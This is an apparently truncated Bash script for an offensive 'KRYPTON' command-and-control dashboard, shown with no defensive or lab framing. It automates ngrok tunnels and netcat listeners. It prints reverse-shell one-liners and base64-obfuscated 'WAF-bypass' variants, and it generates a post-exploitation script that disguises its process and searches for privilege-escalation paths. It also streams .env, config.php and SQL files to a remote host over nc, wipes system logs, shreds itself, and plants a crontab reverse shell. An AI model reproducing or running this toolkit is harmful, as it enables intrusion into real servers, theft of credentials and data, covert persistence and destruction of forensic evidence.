#!/bin/bash

# KRYPTON-BASH - Command & Control Dashboard
# Dark-themed ASCII UI with ngrok automation

# Color and UI setup using tput
BOLD=$(tput bold)
RESET=$(tput sgr0)
BLACK=$(tput setaf 0)
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
BLUE=$(tput setaf 4)
MAGENTA=$(tput setaf 5)
CYAN=$(tput setaf 6)
WHITE=$(tput setaf 7)
BRIGHT_BLACK=$(tput setaf 8)
BRIGHT_RED=$(tput setaf 9)
BRIGHT_GREEN=$(tput setaf 10)
BRIGHT_YELLOW=$(tput setaf 11)
BRIGHT_BLUE=$(tput setaf 12)
BRIGHT_MAGENTA=$(tput setaf 13)
BRIGHT_CYAN=$(tput setaf 14)
BRIGHT_WHITE=$(tput setaf 15)

# Background colors
BG_BLACK=$(tput setab 0)
BG_RED=$(tput setab 1)
BG_GREEN=$(tput setab 2)
BG_YELLOW=$(tput setab 3)
BG_BLUE=$(tput setab 4)
BG_MAGENTA=$(tput setab 5)
BG_CYAN=$(tput setab 6)
BG_WHITE=$(tput setab 7)

# Clear screen and set dark theme
clear_screen() {
    tput clear
    tput cup 0 0
}

# Display banner
show_banner() {
    clear_screen
    echo "${BOLD}${BRIGHT_CYAN}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ███╗   ██╗███████╗██╗    ██╗██╗███╗   ███╗               ║
║   ████╗  ██║██╔════╝██║    ██║██║████╗ ████║               ║
║   ██╔██╗ ██║███████╗██║ █╗ ██║██║██╔████╔██║               ║
║   ██║╚██╗██║╚════██║██║███╗██║██║██║╚██╔╝██║               ║
║   ██║ ╚████║███████║╚███╔███╔╝██║██║ ╚═╝ ██║               ║
║   ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝               ║
║                                                              ║
║                    [ C2 DASHBOARD ]                          ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
EOF
    echo "${RESET}"
    echo ""
}

# Display status bar
show_status() {
    local status=$1
    local message=$2
    
    if [ "$status" = "active" ]; then
        echo -e "${BOLD}${BRIGHT_GREEN}[✓]${RESET} ${BRIGHT_WHITE}$message${RESET}"
    elif [ "$status" = "error" ]; then
        echo -e "${BOLD}${BRIGHT_RED}[✗]${RESET} ${BRIGHT_WHITE}$message${RESET}"
    elif [ "$status" = "warning" ]; then
        echo -e "${BOLD}${BRIGHT_YELLOW}[!]${RESET} ${BRIGHT_WHITE}$message${RESET}"
    elif [ "$status" = "info" ]; then
        echo -e "${BOLD}${BRIGHT_CYAN}[i]${RESET} ${BRIGHT_WHITE}$message${RESET}"
    fi
}

# Display menu options
show_menu() {
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}                        MAIN MENU${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    echo "${BOLD}${BRIGHT_WHITE}[1]${RESET} ${BRIGHT_WHITE}Start ngrok TCP Tunnel (Port 4444)${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[2]${RESET} ${BRIGHT_WHITE}Start Listener (nc -lvnp 4444)${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[3]${RESET} ${BRIGHT_WHITE}Start Full C2 (Tunnel + Listener)${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[4]${RESET} ${BRIGHT_WHITE}Show Tunnel Status${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[5]${RESET} ${BRIGHT_WHITE}Stop ngrok Tunnel${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[6]${RESET} ${BRIGHT_WHITE}Generate Reverse Shell Payload${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[7]${RESET} ${BRIGHT_MAGENTA}Generate WAF-Bypass Obfuscated Payload${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[8]${RESET} ${BRIGHT_YELLOW}Generate Stabilization & Discovery Script${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[9]${RESET} ${BRIGHT_RED}Exfiltration & Forensic Erasure${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[10]${RESET} ${BRIGHT_RED}Persistence & Backdoor${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[11]${RESET} ${BRIGHT_CYAN}Network Pivoting & Lateral Discovery${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[12]${RESET} ${BRIGHT_MAGENTA}Multi-Channel Exfiltration (High-Volume)${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[13]${RESET} ${BRIGHT_MAGENTA}Advanced Payload Obfuscation Engine${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[14]${RESET} ${BRIGHT_CYAN}Pre-Exploitation Audit${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[15]${RESET} ${BRIGHT_CYAN}Memory-Resident Persistence${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}[0]${RESET} ${BRIGHT_RED}Exit${RESET}"
    echo ""
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
}

# ngrok automation function
start_ngrok_tunnel() {
    local port=4444
    
    echo ""
    show_status "info" "Starting ngrok TCP tunnel on port $port..."
    echo ""
    
    # Check if ngrok is installed
    if ! command -v ngrok &> /dev/null; then
        show_status "error" "ngrok is not installed or not in PATH"
        echo ""
        echo "${BRIGHT_YELLOW}Install ngrok from: https://ngrok.com/download${RESET}"
        echo ""
        read -p "Press Enter to continue..."
        return 1
    fi
    
    # Start ngrok in background
    ngrok tcp $port > /dev/null 2>&1 &
    NGROK_PID=$!
    
    # Wait for ngrok to start
    sleep 3
    
    # Extract public URL using curl
    show_status "info" "Extracting public tunnel information..."
    
    # Try to get tunnel info from ngrok API
    TUNNEL_INFO=$(curl -s http://localhost:4040/api/tunnels 2>/dev/null)
    
    if [ -z "$TUNNEL_INFO" ]; then
        show_status "error" "Failed to connect to ngrok API"
        kill $NGROK_PID 2>/dev/null
        read -p "Press Enter to continue..."
        return 1
    fi
    
    # Extract public URL and port
    PUBLIC_URL=$(echo "$TUNNEL_INFO" | grep -o '"public_url":"[^"]*' | cut -d'"' -f4)
    PUBLIC_PORT=$(echo "$PUBLIC_URL" | grep -o '[0-9]*$')
    
    if [ -z "$PUBLIC_URL" ]; then
        show_status "error" "Failed to extract public URL"
        kill $NGROK_PID 2>/dev/null
        read -p "Press Enter to continue..."
        return 1
    fi
    
    # Display success
    echo ""
    show_status "active" "ngrok tunnel started successfully!"
    echo ""
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}                    TUNNEL INFORMATION${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    echo "${BRIGHT_WHITE}Local Port:${RESET}    ${BRIGHT_GREEN}$port${RESET}"
    echo "${BRIGHT_WHITE}Public URL:${RESET}    ${BRIGHT_GREEN}$PUBLIC_URL${RESET}"
    echo "${BRIGHT_WHITE}Public Port:${RESET}   ${BRIGHT_GREEN}$PUBLIC_PORT${RESET}"
    echo "${BRIGHT_WHITE}ngrok PID:${RESET}     ${BRIGHT_GREEN}$NGROK_PID${RESET}"
    echo ""
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    
    # Save tunnel info to file
    echo "$PUBLIC_URL:$PUBLIC_PORT" > /tmp/krypton_tunnel_info.txt
    echo "$NGROK_PID" > /tmp/krypton_ngrok_pid.txt
    
    show_status "info" "Tunnel info saved to /tmp/krypton_tunnel_info.txt"
    echo ""
    read -p "Press Enter to continue..."
}

# Stop ngrok tunnel
stop_ngrok_tunnel() {
    echo ""
    show_status "info" "Stopping ngrok tunnel..."
    
    if [ -f /tmp/krypton_ngrok_pid.txt ]; then
        NGROK_PID=$(cat /tmp/krypton_ngrok_pid.txt)
        kill $NGROK_PID 2>/dev/null
        rm /tmp/krypton_ngrok_pid.txt
        rm /tmp/krypton_tunnel_info.txt 2>/dev/null
        show_status "active" "ngrok tunnel stopped"
    else
        # Try to kill all ngrok processes
        pkill -f "ngrok tcp" 2>/dev/null
        show_status "active" "ngrok processes terminated"
    fi
    echo ""
    read -p "Press Enter to continue..."
}

# Listener module
start_listener() {
    local port=4444
    
    echo ""
    show_status "info" "Starting netcat listener on port $port..."
    echo ""
    echo "${BOLD}${BRIGHT_YELLOW}Waiting for incoming connection...${RESET}"
    echo "${BOLD}${BRIGHT_YELLOW}Press Ctrl+C to stop the listener${RESET}"
    echo ""
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    
    # Start netcat listener
    nc -lvnp $port
}

# Show tunnel status
show_tunnel_status() {
    echo ""
    show_status "info" "Checking tunnel status..."
    echo ""
    
    if [ -f /tmp/krypton_tunnel_info.txt ]; then
        TUNNEL_INFO=$(cat /tmp/krypton_tunnel_info.txt)
        echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
        echo "${BOLD}${BRIGHT_WHITE}                    ACTIVE TUNNEL${RESET}"
        echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
        echo ""
        echo "${BRIGHT_WHITE}Public Address:${RESET} ${BRIGHT_GREEN}$TUNNEL_INFO${RESET}"
        echo ""
        
        # Verify ngrok is still running
        if [ -f /tmp/krypton_ngrok_pid.txt ]; then
            NGROK_PID=$(cat /tmp/krypton_ngrok_pid.txt)
            if ps -p $NGROK_PID > /dev/null 2>&1; then
                show_status "active" "ngrok process is running (PID: $NGROK_PID)"
            else
                show_status "error" "ngrok process is not running"
            fi
        fi
    else
        show_status "warning" "No active tunnel found"
    fi
    
    echo ""
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    read -p "Press Enter to continue..."
}

# Generate reverse shell payload
generate_payload() {
    echo ""
    show_status "info" "Generating reverse shell payload..."
    echo ""
    
    if [ -f /tmp/krypton_tunnel_info.txt ]; then
        TUNNEL_INFO=$(cat /tmp/krypton_tunnel_info.txt)
        HOST=$(echo $TUNNEL_INFO | cut -d: -f1 | sed 's/tcp:\/\///')
        PORT=$(echo $TUNNEL_INFO | cut -d: -f2)
        
        echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
        echo "${BOLD}${BRIGHT_WHITE}                    REVERSE SHELL PAYLOADS${RESET}"
        echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
        echo ""
        echo "${BRIGHT_YELLOW}Target: $HOST:$PORT${RESET}"
        echo ""
        
        echo "${BOLD}${BRIGHT_WHITE}[1] Bash:${RESET}"
        echo "${BRIGHT_GREEN}bash -i >& /dev/tcp/$HOST/$PORT 0>&1${RESET}"
        echo ""
        
        echo "${BOLD}${BRIGHT_WHITE}[2] Netcat:${RESET}"
        echo "${BRIGHT_GREEN}nc -e /bin/bash $HOST $PORT${RESET}"
        echo ""
        
        echo "${BOLD}${BRIGHT_WHITE}[3] Python:${RESET}"
        echo "${BRIGHT_GREEN}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$HOST\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${RESET}"
        echo ""
        
        echo "${BOLD}${BRIGHT_WHITE}[4] PHP:${RESET}"
        echo "${BRIGHT_GREEN}php -r '\$sock=fsockopen(\"$HOST\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${RESET}"
        echo ""
        
        echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    else
        show_status "error" "No active tunnel. Start tunnel first."
    fi
    
    echo ""
    read -p "Press Enter to continue..."
}

# Generate WAF-bypass obfuscated payload
generate_obfuscated_payload() {
    local target_host=""
    local target_port=""
    
    echo ""
    show_status "info" "KRYPTON Payload Generation Module"
    echo ""
    
    # Check if tunnel info exists and offer to use it
    if [ -f /tmp/krypton_tunnel_info.txt ]; then
        TUNNEL_INFO=$(cat /tmp/krypton_tunnel_info.txt)
        AUTO_HOST=$(echo $TUNNEL_INFO | cut -d: -f1 | sed 's/tcp:\/\///')
        AUTO_PORT=$(echo $TUNNEL_INFO | cut -d: -f2)
        
        echo "${BRIGHT_YELLOW}Active tunnel detected: $AUTO_HOST:$AUTO_PORT${RESET}"
        echo -n "${BRIGHT_WHITE}Use this tunnel? [Y/n]: ${RESET}"
        read use_auto
        
        if [[ "$use_auto" =~ ^[Yy]$ ]] || [ -z "$use_auto" ]; then
            target_host=$AUTO_HOST
            target_port=$AUTO_PORT
        fi
    fi
    
    # Manual input if not using auto
    if [ -z "$target_host" ]; then
        echo -n "${BRIGHT_WHITE}Enter ngrok IP/Host: ${RESET}"
        read target_host
        echo -n "${BRIGHT_WHITE}Enter Port: ${RESET}"
        read target_port
    fi
    
    # Validate input
    if [ -z "$target_host" ] || [ -z "$target_port" ]; then
        show_status "error" "Invalid input. Host and Port are required."
        echo ""
        read -p "Press Enter to continue..."
        return 1
    fi
    
    echo ""
    show_status "info" "Generating obfuscated payload..."
    echo ""
    
    # Base payload using /dev/tcp/ with history disable
    BASE_PAYLOAD="unset HISTFILE; bash -i >& /dev/tcp/$target_host/$target_port 0>&1"
    
    # Base64 encode the payload
    B64_PAYLOAD=$(echo -n "$BASE_PAYLOAD" | base64 -w 0)
    
    # Create Python wrapper
    PYTHON_PAYLOAD="python -c \"import base64; exec(base64.b64decode('$B64_PAYLOAD'))\""
    
    # Create Perl wrapper
    PERL_PAYLOAD="perl -e \"use MIME::Base64; eval(decode_base64('$B64_PAYLOAD'))\""
    
    # Display results
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}              WAF-BYPASS OBFUSCATED PAYLOADS${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    echo "${BRIGHT_YELLOW}Target: $target_host:$target_port${RESET}"
    echo ""
    
    echo "${BOLD}${BRIGHT_WHITE}[ORIGINAL] Base Payload (with history disable):${RESET}"
    echo "${BRIGHT_GREEN}$BASE_PAYLOAD${RESET}"
    echo ""
    
    echo "${BOLD}${BRIGHT_WHITE}[BASE64] Encoded Payload:${RESET}"
    echo "${BRIGHT_GREEN}$B64_PAYLOAD${RESET}"
    echo ""
    
    echo "${BOLD}${BRIGHT_WHITE}[PYTHON] python -c wrapper (WAF Bypass):${RESET}"
    echo "${BRIGHT_GREEN}$PYTHON_PAYLOAD${RESET}"
    echo ""
    
    echo "${BOLD}${BRIGHT_WHITE}[PERL] perl -e wrapper (WAF Bypass):${RESET}"
    echo "${BRIGHT_GREEN}$PERL_PAYLOAD${RESET}"
    echo ""
    
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    
    # Save to file
    echo "$PYTHON_PAYLOAD" > /tmp/krypton_payload_python.txt
    echo "$PERL_PAYLOAD" > /tmp/krypton_payload_perl.txt
    echo "$B64_PAYLOAD" > /tmp/krypton_payload_b64.txt
    
    show_status "active" "Payloads saved to /tmp/krypton_payload_*.txt"
    echo ""
    
    # Copy to clipboard option (Linux only)
    if command -v xclip &> /dev/null; then
        echo -n "${BRIGHT_WHITE}Copy Python payload to clipboard? [Y/n]: ${RESET}"
        read copy_clip
        if [[ "$copy_clip" =~ ^[Yy]$ ]] || [ -z "$copy_clip" ]; then
            echo -n "$PYTHON_PAYLOAD" | xclip -selection clipboard
            show_status "active" "Copied to clipboard"
        fi
    fi
    
    echo ""
    read -p "Press Enter to continue..."
}

# Generate stabilization script
generate_stabilization_script() {
    echo ""
    show_status "info" "KRYPTON Stabilization & Discovery Script Generator"
    echo ""
    
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}          AUTONOMOUS STABILIZATION & DISCOVERY${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    echo "${BRIGHT_YELLOW}This script will:${RESET}"
    echo "${BRIGHT_WHITE}  • Upgrade shell to interactive TTY (Python/Script)${RESET}"
    echo "${BRIGHT_WHITE}  • Mask process as [kworker/u2:1] kernel worker${RESET}"
    echo "${BRIGHT_WHITE}  • Discover SUID binaries for privilege escalation${RESET}"
    echo "${BRIGHT_WHITE}  • Check writable /etc/shadow, /etc/passwd, /etc/sudoers${RESET}"
    echo "${BRIGHT_WHITE}  • Gather system and network information${RESET}"
    echo ""
    
    # Generate the script
    cat > /tmp/krypton-stabilize.sh << 'STABILIZE_EOF'
#!/bin/bash

# KRYPTON - Autonomous Stabilization & Discovery Script
# Executes immediately upon shell connection

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗"
echo "║         KRYPTON - Autonomous Stabilization & Discovery       ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# TTY Upgrade
echo -e "${YELLOW}[+]${NC} Attempting TTY upgrade..."
python -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || \
python3 -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || \
script -q /dev/null bash 2>/dev/null

# Terminal settings
export TERM=xterm-256color
stty -echo raw 2>/dev/null
stty rows 50 cols 200 2>/dev/null

# Process masking
echo -e "${YELLOW}[+]${NC} Masking process as [kworker/u2:1]..."
exec -a "[kworker/u2:1]" bash &
perl -e '$0="[kworker/u2:1]";' &

# Privilege check
echo -e "${YELLOW}[+]${NC} Checking privileges..."
echo -e "${GREEN}[*]${NC} Current user: $(whoami)"
groups 2>/dev/null

# SUID discovery
echo -e "${YELLOW}[+]${NC} Scanning SUID binaries..."
find / -perm -4000 -type f 2>/dev/null | head -20

# Writable files
echo -e "${YELLOW}[+]${NC} Checking writable critical files..."
[ -w /etc/shadow ] && echo -e "${RED}[!!!] /etc/shadow is WRITABLE${NC}"
[ -w /etc/passwd ] && echo -e "${RED}[!!!] /etc/passwd is WRITABLE${NC}"
[ -w /etc/sudoers ] && echo -e "${RED}[!!!] /etc/sudoers is WRITABLE${NC}"

# System info
echo -e "${YELLOW}[+]${NC} System info..."
uname -a
hostname

echo -e "${GREEN}[✓]${NC} Stabilization complete"
STABILIZE_EOF
    
    chmod +x /tmp/krypton-stabilize.sh
    
    show_status "active" "Stabilization script generated: /tmp/krypton-stabilize.sh"
    echo ""
    
    echo "${BRIGHT_WHITE}To execute on target:${RESET}"
    echo "${BRIGHT_GREEN}  1. Transfer script to target${RESET}"
    echo "${BRIGHT_GREEN}  2. Run: bash /tmp/krypton-stabilize.sh${RESET}"
    echo ""
    echo "${BRIGHT_WHITE}Or run inline (one-liner):${RESET}"
    echo "${BRIGHT_CYAN}  curl -s http://YOUR_SERVER/krypton-stabilize.sh | bash${RESET}"
    echo ""
    
    # Display script content
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}                    SCRIPT CONTENT${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    cat /tmp/krypton-stabilize.sh
    echo ""
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    
    read -p "Press Enter to continue..."
}

# Exfiltration & Forensic Erasure module
exfiltration_module() {
    local target_host=""
    local target_port=""
    
    echo ""
    show_status "info" "KRYPTON Exfiltration & Forensic Erasure Module"
    echo ""
    
    # Get target connection info
    if [ -f /tmp/krypton_tunnel_info.txt ]; then
        TUNNEL_INFO=$(cat /tmp/krypton_tunnel_info.txt)
        AUTO_HOST=$(echo $TUNNEL_INFO | cut -d: -f1 | sed 's/tcp:\/\///')
        AUTO_PORT=$(echo $TUNNEL_INFO | cut -d: -f2)
        
        echo "${BRIGHT_YELLOW}Active tunnel detected: $AUTO_HOST:$AUTO_PORT${RESET}"
        echo -n "${BRIGHT_WHITE}Use this tunnel for exfiltration? [Y/n]: ${RESET}"
        read use_auto
        
        if [[ "$use_auto" =~ ^[Yy]$ ]] || [ -z "$use_auto" ]; then
            target_host=$AUTO_HOST
            target_port=$AUTO_PORT
        fi
    fi
    
    if [ -z "$target_host" ]; then
        echo -n "${BRIGHT_WHITE}Enter exfiltration host: ${RESET}"
        read target_host
        echo -n "${BRIGHT_WHITE}Enter exfiltration port: ${RESET}"
        read target_port
    fi
    
    echo ""
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}              TARGETED FILE SEARCH${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    show_status "info" "Searching for .env, config.php, and .sql files in /var/www/..."
    echo ""
    
    # Targeted search for sensitive files
    ENV_FILES=$(find /var/www -name ".env" -type f 2>/dev/null)
    CONFIG_FILES=$(find /var/www -name "config.php" -type f 2>/dev/null)
    SQL_FILES=$(find /var/www -name "*.sql" -type f 2>/dev/null)
    
    TOTAL_FOUND=0
    
    if [ -n "$ENV_FILES" ]; then
        echo -e "${BRIGHT_GREEN}[.env] Files found:${RESET}"
        echo "$ENV_FILES"
        TOTAL_FOUND=$((TOTAL_FOUND + $(echo "$ENV_FILES" | wc -l)))
        echo ""
    fi
    
    if [ -n "$CONFIG_FILES" ]; then
        echo -e "${BRIGHT_GREEN}[config.php] Files found:${RESET}"
        echo "$CONFIG_FILES"
        TOTAL_FOUND=$((TOTAL_FOUND + $(echo "$CONFIG_FILES" | wc -l)))
        echo ""
    fi
    
    if [ -n "$SQL_FILES" ]; then
        echo -e "${BRIGHT_GREEN}[.sql] Files found:${RESET}"
        echo "$SQL_FILES"
        TOTAL_FOUND=$((TOTAL_FOUND + $(echo "$SQL_FILES" | wc -l)))
        echo ""
    fi
    
    if [ $TOTAL_FOUND -eq 0 ]; then
        show_status "warning" "No sensitive files found in /var/www/"
        echo ""
        read -p "Press Enter to continue..."
        return 1
    fi
    
    show_status "active" "Found $TOTAL_FOUND sensitive file(s)"
    echo ""
    
    # Stealth Transfer
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}              STEALTH EXFILTRATION${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    show_status "info" "Compressing and streaming files over TCP (no local storage)..."
    echo ""
    echo "${BRIGHT_YELLOW}Target: $target_host:$target_port${RESET}"
    echo ""
    
    # Create temporary file list
    TEMP_FILELIST=$(mktemp)
    echo "$ENV_FILES" > "$TEMP_FILELIST"
    echo "$CONFIG_FILES" >> "$TEMP_FILELIST"
    echo "$SQL_FILES" >> "$TEMP_FILELIST"
    
    # Stream compressed data over TCP without saving locally
    echo -n "${BRIGHT_WHITE}Initiating stealth transfer... ${RESET}"
    
    # Use tar to compress and stream directly over TCP
    cat "$TEMP_FILELIST" | xargs tar -czf - 2>/dev/null | nc -w 10 $target_host $target_port 2>/dev/null &
    TRANSFER_PID=$!
    
    sleep 2
    
    if ps -p $TRANSFER_PID > /dev/null 2>&1; then
        show_status "active" "Transfer in progress..."
        wait $TRANSFER_PID 2>/dev/null
        show_status "active" "Transfer completed"
    else
        show_status "warning" "Transfer may have failed (check listener)"
    fi
    
    # Clean up temp file list
    rm -f "$TEMP_FILELIST"
    
    echo ""
    
    # Scorched Earth - Forensic Erasure
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}              SCORCHED EARTH - FORENSIC ERASURE${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    echo -n "${BRIGHT_RED}WARNING: This will clear logs and shred this script. Proceed? [y/N]: ${RESET}"
    read confirm
    
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        echo ""
        show_status "info" "Executing forensic erasure..."
        echo ""
        
        # Clear lastlog
        if [ -f /var/log/lastlog ]; then
            echo -n "${BRIGHT_WHITE}Clearing /var/log/lastlog... ${RESET}"
            > /var/log/lastlog 2>/dev/null
            show_status "active" "Cleared"
        fi
        
        # Clear auth.log
        if [ -f /var/log/auth.log ]; then
            echo -n "${BRIGHT_WHITE}Clearing /var/log/auth.log... ${RESET}"
            > /var/log/auth.log 2>/dev/null
            show_status "active" "Cleared"
        fi
        
        # Also clear other common log files
        for logfile in /var/log/wtmp /var/log/btmp /var/log/secure /var/log/syslog; do
            if [ -f "$logfile" ]; then
                echo -n "${BRIGHT_WHITE}Clearing $logfile... ${RESET}"
                > "$logfile" 2>/dev/null
                show_status "active" "Cleared"
            fi
        done
        
        echo ""
        show_status "info" "Shredding this script..."
        
        # Shred the script itself
        if command -v shred &> /dev/null; then
            shred -vfuz "$0" 2>/dev/null
        else
            # Fallback if shred not available
            rm -f "$0"
        fi
        
        echo ""
        show_status "active" "Forensic erasure complete. Exiting..."
        echo ""
        exit 0
    else
        echo ""
        show_status "warning" "Forensic erasure cancelled"
        echo ""
    fi
    
    echo ""
    read -p "Press Enter to continue..."
}

# Persistence & Backdoor module
persistence_module() {
    local reverse_shell_payload=""
    local target_host=""
    local target_port=""
    local ssh_public_key=""
    
    echo ""
    show_status "info" "KRYPTON Persistence & Backdoor Module"
    echo ""
    
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}              PERSISTENCE OPTIONS${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    echo "${BRIGHT_WHITE}[1]${RESET} Cron-Job Hijack (30-minute reverse shell)"
    echo "${BRIGHT_WHITE}[2]${RESET} Systemd Service (fake dbus-monitor.service)"
    echo "${BRIGHT_WHITE}[3]${RESET} SSH-Key Injection (authorized_keys)"
    echo "${BRIGHT_WHITE}[4]${RESET} All Persistence Methods"
    echo "${BRIGHT_WHITE}[0]${RESET} Back to Main Menu"
    echo ""
    echo -n "${BOLD}${BRIGHT_WHITE}Select option [0-4]: ${RESET}"
    read persist_choice
    
    case $persist_choice in
        1)
            # Cron-Job Hijack
            echo ""
            show_status "info" "Cron-Job Hijack Setup"
            echo ""
            
            # Get reverse shell payload
            if [ -f /tmp/krypton_tunnel_info.txt ]; then
                TUNNEL_INFO=$(cat /tmp/krypton_tunnel_info.txt)
                AUTO_HOST=$(echo $TUNNEL_INFO | cut -d: -f1 | sed 's/tcp:\/\///')
                AUTO_PORT=$(echo $TUNNEL_INFO | cut -d: -f2)
                
                echo "${BRIGHT_YELLOW}Active tunnel detected: $AUTO_HOST:$AUTO_PORT${RESET}"
                echo -n "${BRIGHT_WHITE}Use this tunnel? [Y/n]: ${RESET}"
                read use_auto
                
                if [[ "$use_auto" =~ ^[Yy]$ ]] || [ -z "$use_auto" ]; then
                    target_host=$AUTO_HOST
                    target_port=$AUTO_PORT
                fi
            fi
            
            if [ -z "$target_host" ]; then
                echo -n "${BRIGHT_WHITE}Enter reverse shell host: ${RESET}"
                read target_host
                echo -n "${BRIGHT_WHITE}Enter reverse shell port: ${RESET}"
                read target_port
            fi
            
            # Generate cron payload
            CRON_PAYLOAD="*/30 * * * * bash -c 'bash -i >& /dev/tcp/$target_host/$target_port 0>&1' # $(date +%s | md5sum | head -c 8)"
            
            echo ""
            echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
            echo "${BOLD}${BRIGHT_WHITE}              CRON ENTRY${RESET}"
            echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
            echo ""
            echo "${BRIGHT_GREEN}$CRON_PAYLOAD${RESET}"
            echo ""
            
            # Add to crontab
            echo -n "${BRIGHT_WHITE}Add to current user's crontab? [y/N]: ${RESET}"
            read confirm_cron
            
            if [[ "$confirm_cron" =~ ^[Yy]$ ]]; then
                (crontab -l 2>/dev/null; echo "$CRON_PAYLOAD") | crontab - 2>/dev/null
                if [ $? -eq 0 ]; then
                    show_status "active" "Cron entry added successfully"
                else
                    show_status "error" "Failed to add cron entry (insufficient permissions?)"
                fi
            else
                show_status "warning" "Cron entry not added"
            fi
            ;;
            
        2)
            # Systemd Service
            echo ""
            show_status "info" "Systemd Service Setup"
            echo ""
            
            # Get reverse shell payload
            if [ -f /tmp/krypton_tunnel_info.txt ]; then
                TUNNEL_INFO=$(cat /tmp/krypton_tunnel_info.txt)
                AUTO_HOST=$(echo $TUNNEL_INFO | cut -d: -f1 | sed 's/tcp:\/\///')
                AUTO_PORT=$(echo $TUNNEL_INFO | cut -d: -f2)
                
                echo "${BRIGHT_YELLOW}Active tunnel detected: $AUTO_HOST:$AUTO_PORT${RESET}"
                echo -n "${BRIGHT_WHITE}Use this tunnel? [Y/n]: ${RESET}"
                read use_auto
                
                if [[ "$use_auto" =~ ^[Yy]$ ]] || [ -z "$use_auto" ]; then
                    target_host=$AUTO_HOST
                    target_port=$AUTO_PORT
                fi
            fi
            
            if [ -z "$target_host" ]; then
                echo -n "${BRIGHT_WHITE}Enter reverse shell host: ${RESET}"
                read target_host
